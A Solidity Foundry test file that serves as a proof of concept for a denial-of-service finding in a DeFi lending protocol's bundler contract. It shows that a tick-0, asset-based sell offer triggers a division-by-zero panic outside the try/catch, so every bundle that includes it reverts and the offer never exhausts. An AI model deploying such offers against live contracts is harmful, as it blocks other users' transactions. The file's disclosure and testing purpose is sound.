// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.34;
import {Test, console} from "lib/forge-std/src/Test.sol";
import {BaseTest} from "./BaseTest.sol";
import {TickLib, MAX_TICK} from "../src/libraries/TickLib.sol";
import {WAD, ORACLE_PRICE_SCALE, DEFAULT_TICK_SPACING} from "../src/libraries/ConstantsLib.sol";
import {MidnightBundles} from "../src/periphery/MidnightBundles.sol";
import {IMidnightBundles, Take, CollateralWithdrawal, CollateralSupply, TokenPermit, PermitKind} from "../src/periphery/interfaces/IMidnightBundles.sol";
import {Market, Offer, CollateralParams} from "../src/interfaces/IMidnight.sol";

/// @notice Proves that tick-0 asset-based (maxAssets>0) offers permanently DoS MidnightBundles
/// via division-by-zero in ConsumableUnitsLib, which is called OUTSIDE the try/catch.
/// Attack: permissionlessly create such an offer gives all bundler calls including it revert.
contract TickZeroBundlerDoSTest is BaseTest {
    MidnightBundles midnightBundles;
    Market market;
    bytes32 id;

    function setUp() public override {
        super.setUp();
        midnightBundles = new MidnightBundles(address(midnight));
        
        market.loanToken = address(loanToken);
        market.maturity = vm.getBlockTimestamp() + 365 days;
        market.collateralParams.push(CollateralParams({
            token: address(collateralToken1),
            lltv: 0.77e18,
            maxLif: maxLif(0.77e18, 0.25e18),
            oracle: address(oracle1)
        }));
        market.rcfThreshold = 0;
        id = midnight.touchMarket(market);
        
        vm.prank(lender);
        midnight.setIsAuthorized(address(midnightBundles), true, lender);
        vm.prank(borrower);
        midnight.setIsAuthorized(address(midnightBundles), true, borrower);
        
        deal(address(loanToken), lender, 10000e18);
        deal(address(collateralToken1), borrower, 10000e18);
        
        vm.prank(borrower);
        collateralToken1.approve(address(midnight), 10000e18);
        vm.prank(borrower);
        midnight.supplyCollateral(market, 0, 10000e18, borrower);
        
        vm.prank(lender);
        loanToken.approve(address(midnightBundles), type(uint256).max);
    }

    /// Root cause: tickToPrice rounds to nearest PRICE_ROUNDING_STEP=1e12.
    /// Ticks 0 and 1 both round DOWN to 0 (below 0.5e12 threshold).
    function testRoot_TickZeroGivesPriceZero() public pure {
        assertEq(TickLib.tickToPrice(0), 0, "tick 0 gives price 0");
        assertEq(TickLib.tickToPrice(1), 0, "tick 1 gives price 0");
        assertGt(TickLib.tickToPrice(2), 0, "tick 2 gives price > 0");
        // Tick 0 is ALWAYS accessible: 0 % DEFAULT_TICK_SPACING(4) = 0
        assertEq(0 % DEFAULT_TICK_SPACING, 0, "tick 0 always accessible");
    }

    /// Direct take of tick-0 unit-based offer works fine (no ConsumableUnitsLib).
    function testDirectTakeTickZeroUnitBased_Works() public {
        Offer memory offer;
        offer.buy = false; offer.maker = borrower; offer.market = market;
        offer.ratifier = address(dummyRatifier);
        offer.expiry = vm.getBlockTimestamp() + 200;
        offer.tick = 0;
        offer.maxUnits = 1000e18; // unit-based: consumableUnits returns maxUnits-consumed, no division
        
        midnight.take(offer, "", 100e18, address(this), address(0), address(0), "");
        assertEq(midnight.debtOf(id, borrower), 100e18, "borrower has 100e18 debt for 0 tokens received");
    }

    /// THE CRITICAL FINDING:
    /// 1) Attacker creates tick-0, maxAssets>0 (asset-based) sell offer — zero cost, permissionless.
    /// 2) Any bundler including this offer calls ConsumableUnitsLib.sellerAssetsToUnits(price=0)
    ///    gives mulDivDown(assets, WAD, 0) gives Solidity 0.8 PANIC (division by zero)
    /// 3) Panic is OUTSIDE the try/catch on take gives reverts ENTIRE bundle, not just that offer
    /// 4) Legitimate offers in the same bundle array also fail
    function testBundlerDoS_TickZeroAssetBased_Reverts() public {
        // Legitimate offer alone works
        Offer memory legit;
        legit.buy = false; legit.maker = borrower; legit.market = market;
        legit.ratifier = address(dummyRatifier);
        legit.expiry = vm.getBlockTimestamp() + 200;
        legit.tick = MAX_TICK; legit.maxUnits = 1000e18;
        legit.group = bytes32(uint256(1));
        
        Take[] memory legitOnly = new Take[](1);
        legitOnly[0] = Take({offer: legit, units: 100e18, ratifierData: ""});
        
        vm.prank(lender);
        midnightBundles.buyWithUnitsTargetAndWithdrawCollateral(
            100e18, 1000e18, lender, TokenPermit({kind: PermitKind.None, data: ""}),
            legitOnly, new CollateralWithdrawal[](0), address(0), 0, address(0));
        console.log("Legit-only bundle: PASSES");
        
        // Malicious offer: tick=0, maxAssets>0 (asset-based), maxUnits=0
        Offer memory malicious;
        malicious.buy = false; malicious.maker = borrower; malicious.market = market;
        malicious.ratifier = address(dummyRatifier);
        malicious.expiry = vm.getBlockTimestamp() + 200;
        malicious.tick = 0;            // price = 0
        malicious.maxAssets = 1e30;   // asset-based cap — consumed never reaches this
        malicious.group = bytes32(0);  // different group
        
        Take[] memory withMalicious = new Take[](2);
        withMalicious[0] = Take({offer: legit, units: 50e18, ratifierData: ""});
        withMalicious[1] = Take({offer: malicious, units: 50e18, ratifierData: ""});
        
        // REVERTS: ConsumableUnitsLib.sellerAssetsToUnits divides by sellerPrice=0
        // This panic propagates OUTSIDE the try/catch in the bundler loop
        vm.expectRevert();
        vm.prank(lender);
        midnightBundles.buyWithUnitsTargetAndWithdrawCollateral(
            100e18, 1000e18, lender, TokenPermit({kind: PermitKind.None, data: ""}),
            withMalicious, new CollateralWithdrawal[](0), address(0), 0, address(0));
        console.log("Bundle with malicious tick-0 asset-based offer: REVERTS (confirmed DoS)");
    }

    /// The DoS persists: consumed counter never increments for tick-0 asset-based offers,
    /// so the offer cannot be "exhausted" by taking it, only explicitly cancelled.
    function testMaliciousOffer_ConsumedNeverIncrement() public {
        Offer memory offer;
        offer.buy = false; offer.maker = borrower; offer.market = market;
        offer.ratifier = address(dummyRatifier);
        offer.expiry = vm.getBlockTimestamp() + 200;
        offer.tick = 0;
        offer.maxAssets = 1e30; // asset-based: consumed += sellerAssets = 0 per take

        // Take 10 times — consumed stays 0 each time
        for (uint i = 0; i < 10; i++) {
            midnight.take(offer, "", 1e18, address(this), address(0), address(0), "");
        }
        // consumed[borrower][0] = 0 (never incremented, offer never exhausts)
        assertEq(midnight.consumed(borrower, 0), 0, "consumed never increments for tick-0 asset-based");
        console.log("After 10 takes, consumed still:", midnight.consumed(borrower, 0));
        // The offer is permanently active (DoS persists) until maker calls setConsumed
    }
}
